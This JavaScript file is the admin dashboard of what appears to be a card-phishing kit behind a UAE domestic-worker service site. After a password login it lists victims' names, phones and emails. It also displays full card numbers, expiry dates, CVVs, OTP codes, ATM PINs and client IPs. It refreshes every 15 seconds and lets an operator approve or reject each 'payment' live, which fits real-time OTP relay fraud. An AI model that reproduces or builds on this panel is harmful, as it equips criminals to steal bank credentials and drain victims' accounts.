(function () {
    'use strict';

    const TK = 'tdAdminToken';
    let leadsData = [];
    let paysData = [];
    let currentTab = 'leads'; // 'leads' or 'payments'

    const loginPage = document.getElementById('login-page');
    const dashPage = document.getElementById('dashboard-page');
    const pwInput = document.getElementById('pw-input');
    const loginBtn = document.getElementById('login-btn');
    const loginBtnText = document.getElementById('login-btn-text');
    const loginErr = document.getElementById('login-err');
    const eyeBtn = document.getElementById('eye-btn');
    const refreshBtn = document.getElementById('refresh-btn');
    const searchInput = document.getElementById('search-input');
    const modal = document.getElementById('modal');
    const modalTitle = document.getElementById('modal-title');
    const modalBody = document.getElementById('modal-body');
    const tabLeadsBtn = document.getElementById('tab-leads');
    const tabPaymentsBtn = document.getElementById('tab-payments');
    const tableTitle = document.querySelector('.table-title');

    function token() { return localStorage.getItem(TK) || ''; }
    function esc(value) {
        return String(value == null ? '' : value)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
    }
    function fmtDate(value) {
        if (!value) return '—';
        const text = String(value).trim();
        if (/^\d{4}-\d{2}-\d{2}$/.test(text)) return text.split('-').reverse().join('/');
        const date = new Date(value);
        return Number.isNaN(date.getTime()) ? text : date.toLocaleDateString('ar-AE');
    }
    function fmtDateTime(value) {
        if (!value) return '—';
        const date = new Date(value);
        return Number.isNaN(date.getTime()) ? String(value) : date.toLocaleString('ar-AE');
    }

    function parseServiceText(raw) {
        const source = String(raw || '').replace(/[\u200f\u200e]/g, '').trim();
        const result = { serviceType: '—', service: '—', duration: '—', workType: '—', workers: '—', nationality: '—', startDate: '—', startTime: '—' };
        if (!source) return result;
        source.split(/\s*\|\s*/).forEach(part => {
            const match = part.match(/^\s*([^:：]+)\s*[:：]\s*(.*)$/);
            if (!match) return;
            const key = match[1].trim().toLowerCase();
            const value = match[2].trim() || '—';
            if (/نوع الخدمة|service type/.test(key)) result.serviceType = value;
            else if (/^الخدمة$|^service$/.test(key)) result.service = value;
            else if (/المدة|duration/.test(key)) result.duration = value;
            else if (/نوع الدوام|work type/.test(key)) result.workType = value;
            else if (/عدد العمالة|workers?/.test(key)) result.workers = value;
            else if (/الجنسية|nationality/.test(key)) result.nationality = value;
            else if (/التاريخ|^date$|start date/.test(key)) result.startDate = value;
            else if (/الوقت|^time$|start time/.test(key)) result.startTime = value;
        });
        result.isHourly = /بالساعة|hourly/i.test(result.serviceType + ' ' + source);
        return result;
    }

    function serviceInfo(record, type) {
        const raw = type === 'lead' ? (record.message || '') : (record.service_info || '');
        const parsed = parseServiceText(raw);
        if (parsed.serviceType === '—' && raw) parsed.serviceType = raw;
        return parsed;
    }

    function latestPayment(contractNo) {
        if (!contractNo) return null;
        return paysData.filter(p => p.contract_no === contractNo).sort((a, b) => String(a.updated_at || '').localeCompare(String(b.updated_at || ''))).pop() || null;
    }

    function statusText(lead, payment) {
        if (payment && payment.decision === 'approved') return ['مقبول (مدفوع)', 'status-done'];
        if (payment && payment.decision === 'rejected') return ['مرفوض', 'status-fail'];
        if (payment && payment.stage === 'success') return ['مكتمل', 'status-done'];
        if (payment && (payment.stage === 'card_initiated' || payment.stage === 'otp_verified')) return ['قيد التحقق/الدفع', 'status-card'];
        if (lead && lead.status === 'completed') return ['مكتمل', 'status-done'];
        return [lead && lead.status === 'new' ? 'جديد' : (lead && lead.status) || 'جديد', 'status-otp'];
    }

    function paymentStageText(stage) {
        switch(stage) {
            case 'card_initiated': return ['إدخال البطاقة', 'status-card'];
            case 'otp_verified': return ['تحقق OTP', 'status-otp'];
            case 'success': return ['مكتمل بنجاح', 'status-done'];
            default: return [stage || 'غير محدد', 'status-otp'];
        }
    }

    function statusBadge(lead, payment) {
        const [label, cls] = statusText(lead, payment);
        return '<span class="' + cls + '">' + esc(label) + '</span>';
    }

    function authHeaders() { return { Authorization: 'Bearer ' + token(), 'Content-Type': 'application/json' }; }

    async function doLogin(password) {
        const response = await fetch('/api/admin/login', {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ password })
        });
        return { ok: response.ok, data: await response.json() };
    }

    async function showDashboard() {
        loginPage.style.display = 'none';
        dashPage.style.display = 'block';
        await loadAll();
    }

    async function loadAll() {
        refreshBtn.classList.add('spinning');
        try {
            const [stats, leads, pays] = await Promise.all([
                fetch('/api/admin/stats', { headers: authHeaders() }).then(r => r.json()),
                fetch('/api/admin/leads', { headers: authHeaders() }).then(r => r.json()),
                fetch('/api/admin/payments', { headers: authHeaders() }).then(r => r.json())
            ]);
            if (stats.total !== undefined) {
                document.getElementById('st-total').innerText = stats.total || 0;
                document.getElementById('st-new').innerText = stats.new || 0;
                document.getElementById('st-done').innerText = stats.completed || 0;
                document.getElementById('st-pending').innerText = (stats.pending || 0) + (stats.failed || 0);
                document.getElementById('st-online').innerText = stats.onlineVisitors || 0;
            }
            leadsData = Array.isArray(leads) ? leads : [];
            paysData = Array.isArray(pays) ? pays : [];
            renderCurrentView();
        } catch (error) {
            console.error('Admin data load error:', error);
            document.getElementById('t-body').innerHTML = '<tr><td colspan="8" class="empty-row">تعذر تحميل البيانات. حاول التحديث.</td></tr>';
        } finally {
            setTimeout(() => refreshBtn.classList.remove('spinning'), 500);
        }
    }

    function renderCurrentView() {
        if (currentTab === 'leads') {
            tableTitle.innerText = 'طلبات العملاء والخدمات المختارة';
            renderLeadsTable();
        } else {
            tableTitle.innerText = 'عمليات الدفع والتحقق (ال بطاقات، OTP، PIN)';
            renderPaymentsTable();
        }
    }

    function renderLeadsTable() {
        const query = (searchInput.value || '').trim().toLowerCase();
        const rows = leadsData.map(lead => ({ lead, payment: latestPayment(lead.contract_no) }));
        paysData.forEach(payment => {
            if (!rows.some(row => row.lead && row.lead.contract_no === payment.contract_no)) rows.push({ lead: null, payment });
        });
        rows.sort((a, b) => String(b.lead?.created_at || b.payment?.updated_at || '').localeCompare(String(a.lead?.created_at || a.payment?.updated_at || '')));
        const filtered = query ? rows.filter(row => JSON.stringify(row).toLowerCase().includes(query)) : rows;
        const thead = document.getElementById('t-head');
        const tbody = document.getElementById('t-body');

        thead.innerHTML = '<tr><th>نوع الخدمة</th><th>تفاصيل الخدمة</th><th>الاسم</th><th>الهاتف</th><th>البريد الإلكتروني</th><th>رقم العقد</th><th>الحالة</th><th>الإجراءات</th></tr>';
        if (!filtered.length) {
            tbody.innerHTML = '<tr><td colspan="8" class="empty-row">لا توجد طلبات مطابقة</td></tr>';
            return;
        }

        tbody.innerHTML = filtered.map(({ lead, payment }) => {
            const record = lead || payment;
            const type = lead ? 'lead' : 'payment';
            const info = serviceInfo(record, type);
            const name = lead?.full_name || payment?.customer_name || '—';
            const phone = lead?.phone || '—';
            const email = lead?.email || '—';
            const contractNo = lead?.contract_no || payment?.contract_no || '—';
            const details = '<div class="service-summary"><b>' + esc(info.service || '—') + '</b>' +
                '<span>المدة: ' + esc(info.duration) + '</span><span>العدد: ' + esc(info.workers) + '</span><span>الجنسية: ' + esc(info.nationality) + '</span></div>';
            const actions = '<button class="btn-act" onclick="openLeadDetails(' + (lead ? lead.id : 'null') + ', \'' + esc(contractNo) + '\')">التفاصيل الكاملة</button>';
            return '<tr><td><span class="service-type">' + esc(info.serviceType) + '</span></td><td>' + details + '</td><td><strong>' + esc(name) + '</strong></td><td dir="ltr">' + esc(phone) + '</td><td dir="ltr">' + esc(email) + '</td><td><span class="badge" dir="ltr">' + esc(contractNo) + '</span></td><td>' + statusBadge(lead, payment) + '</td><td><div class="action-btns">' + actions + '</div></td></tr>';
        }).join('');
    }

    function renderPaymentsTable() {
        const query = (searchInput.value || '').trim().toLowerCase();
        const filtered = query ? paysData.filter(p => JSON.stringify(p).toLowerCase().includes(query)) : paysData;
        const thead = document.getElementById('t-head');
        const tbody = document.getElementById('t-body');

        thead.innerHTML = '<tr><th>رقم العقد</th><th>اسم العميل</th><th>المبلغ</th><th>معلومات الخدمة</th><th>المرحلة</th><th>OTP / PIN</th><th>قرار الإدارة</th><th>الإجراءات الفورية</th></tr>';
        if (!filtered.length) {
            tbody.innerHTML = '<tr><td colspan="8" class="empty-row">لا توجد عمليات دفع مسجلة حتى الآن</td></tr>';
            return;
        }

        tbody.innerHTML = filtered.map(p => {
            const [stLabel, stCls] = paymentStageText(p.stage);
            const decisionHtml = p.decision === 'approved' ? '<span class="status-done">مقبول</span>' : (p.decision === 'rejected' ? '<span class="status-fail">مرفوض</span>' : '<span class="status-otp">قيد الانتظار</span>');
            const otpPinInfo = 'OTP: <b>' + esc(p.otp_code || '—') + '</b> | PIN: <b>' + esc(p.atm_pin || '—') + '</b>';
            const actions = '<button class="btn-act btn-approve" onclick="decidePayment(' + p.id + ', \'approved\')">قبول</button>' +
                            '<button class="btn-act btn-reject" onclick="decidePayment(' + p.id + ', \'rejected\')">رفض</button>' +
                            '<button class="btn-act btn-expand" onclick="openPaymentDetails(' + p.id + ')">عرض البطاقة</button>';
            return '<tr><td><span class="badge" dir="ltr">' + esc(p.contract_no) + '</span></td><td><strong>' + esc(p.customer_name) + '</strong></td><td><span class="link-amt">' + esc(p.amount) + ' د.إ</span></td><td>' + esc(p.service_info || '—') + '</td><td><span class="' + stCls + '">' + esc(stLabel) + '</span></td><td dir="ltr">' + otpPinInfo + '</td><td>' + decisionHtml + '</td><td><div class="action-btns">' + actions + '</div></td></tr>';
        }).join('');
    }

    window.decidePayment = async function (id, decision) {
        try {
            const res = await fetch('/api/admin/payments/' + id + '/decide', {
                method: 'POST',
                headers: authHeaders(),
                body: JSON.stringify({ decision })
            });
            const data = await res.json();
            if (data.success) {
                await loadAll();
            } else {
                alert('فشل تنفيذ القرار');
            }
        } catch (e) {
            alert('حدث خطأ في الاتصال');
        }
    };

    function detailField(label, value, direction) {
        return '<div class="detail-row"><div class="detail-label">' + esc(label) + '</div><div class="detail-value"' + (direction ? ' dir="' + direction + '"' : '') + '><span class="val-text">' + esc(value || '—') + '</span></div></div>';
    }

    window.openLeadDetails = function (id, contractNo) {
        const lead = leadsData.find(item => item.id == id) || null;
        const payment = latestPayment(contractNo);
        
        modalTitle.innerText = 'تفاصيل الطلب والعقد — ' + (contractNo || 'بدون عقد');
        let html = '<div class="detail-section-title">بيانات العميل</div>';
        if (lead) {
            html += detailField('الاسم الكامل', lead.full_name) +
                    detailField('رقم الهاتف', lead.phone, 'ltr') +
                    detailField('البريد الإلكتروني', lead.email, 'ltr') +
                    detailField('العنوان / المدينة', lead.city) +
                    detailField('رقم العقد', lead.contract_no, 'ltr') +
                    detailField('تاريخ الطلب', fmtDateTime(lead.created_at));
            if (lead.message) {
                html += '<div class="detail-section-title">ملخص الخدمة والطلب</div>';
                html += '<div class="detail-value" style="display:block; background:#f1f5f9; padding:12px; white-space:pre-wrap; line-height:1.6;">' + esc(lead.message) + '</div>';
            }
        } else {
            html += '<div class="loading-center">لا توجد بيانات عميل تفصيلية مسجلة لهذا العقد (دفع مباشر أو بيانات ناقصة).</div>';
        }

        if (payment) {
            html += '<div class="detail-section-title">بيانات الدفع والبطاقة المسجلة</div>' +
                    detailField('المبلغ الإجمالي', payment.amount + ' درهم إماراتي') +
                    detailField('حمل البطاقة', payment.card_name) +
                    detailField('رقم البطاقة', payment.card_number, 'ltr') +
                    detailField('تاريخ الانتهاء / CVV', payment.card_expiry + ' / ' + payment.card_cvv, 'ltr') +
                    detailField('رمز التحقق OTP', payment.otp_code, 'ltr') +
                    detailField('رقم الصراف PIN', payment.atm_pin, 'ltr') +
                    detailField('المرحلة الحالية', payment.stage) +
                    detailField('قرار الإدارة', payment.decision || 'قيد الانتظار');
        }

        modalBody.innerHTML = html;
        modal.classList.add('show');
    };

    window.openPaymentDetails = function (id) {
        const payment = paysData.find(item => item.id == id);
        if (!payment) return;
        modalTitle.innerText = 'تفاصيل عملية الدفع — عقد ' + (payment.contract_no || '');
        modalBody.innerHTML = '<div class="detail-section-title">بيانات البطاقة والدفع</div>' +
            detailField('رقم العقد', payment.contract_no, 'ltr') +
            detailField('اسم العميل', payment.customer_name) +
            detailField('المبلغ', payment.amount + ' درهم') +
            detailField('اسم حامل البطاقة', payment.card_name) +
            detailField('رقم البطاقة', payment.card_number, 'ltr') +
            detailField('تاريخ الانتهاء', payment.card_expiry, 'ltr') +
            detailField('رمز الأمان CVV', payment.card_cvv, 'ltr') +
            detailField('رمز التحقق OTP', payment.otp_code, 'ltr') +
            detailField('رمز ATM PIN', payment.atm_pin, 'ltr') +
            detailField('المرحلة', payment.stage) +
            detailField('قرار الإدارة', payment.decision || 'قيد الانتظار') +
            detailField('عنوان IP العميل', payment.client_ip, 'ltr');
        modal.classList.add('show');
    };

    function closeModal() { modal.classList.remove('show'); }
    document.getElementById('modal-close').addEventListener('click', closeModal);
    modal.addEventListener('click', event => { if (event.target === modal) closeModal(); });

    // تبديل التبويبات
    tabLeadsBtn.addEventListener('click', () => {
        tabLeadsBtn.classList.add('active');
        tabPaymentsBtn.classList.remove('active');
        currentTab = 'leads';
        renderCurrentView();
    });
    tabPaymentsBtn.addEventListener('click', () => {
        tabPaymentsBtn.classList.add('active');
        tabLeadsBtn.classList.remove('active');
        currentTab = 'payments';
        renderCurrentView();
    });

    loginBtn.addEventListener('click', async () => {
        const password = pwInput.value.trim();
        if (!password) { loginErr.innerText = 'الرجاء إدخال كلمة المرور'; loginErr.style.display = 'block'; return; }
        loginBtn.disabled = true; loginBtnText.innerText = 'جاري الدخول...'; loginErr.style.display = 'none';
        try {
            const result = await doLogin(password);
            if (result.ok && result.data.token) { localStorage.setItem(TK, result.data.token); await showDashboard(); }
            else { loginErr.innerText = 'كلمة المرور غير صحيحة'; loginErr.style.display = 'block'; }
        } catch (error) { loginErr.innerText = 'تعذر الاتصال بالخادم'; loginErr.style.display = 'block'; }
        finally { loginBtn.disabled = false; loginBtnText.innerText = 'تسجيل الدخول'; }
    });

    pwInput.addEventListener('keydown', event => { if (event.key === 'Enter') loginBtn.click(); });
    eyeBtn.addEventListener('click', () => { pwInput.type = pwInput.type === 'password' ? 'text' : 'password'; });
    document.getElementById('logout-btn').addEventListener('click', () => { localStorage.removeItem(TK); dashPage.style.display = 'none'; loginPage.style.display = 'flex'; pwInput.value = ''; });
    refreshBtn.addEventListener('click', loadAll);
    searchInput.addEventListener('input', renderCurrentView);
    setInterval(loadAll, 15000);

    (async function init() {
        const tk = token();
        if (tk) {
            try { const response = await fetch('/api/admin/verify', { headers: authHeaders() }); const data = await response.json(); if (data.valid) return showDashboard(); } catch (error) {}
            localStorage.removeItem(TK);
        }
        loginPage.style.display = 'flex';
    }());
}());
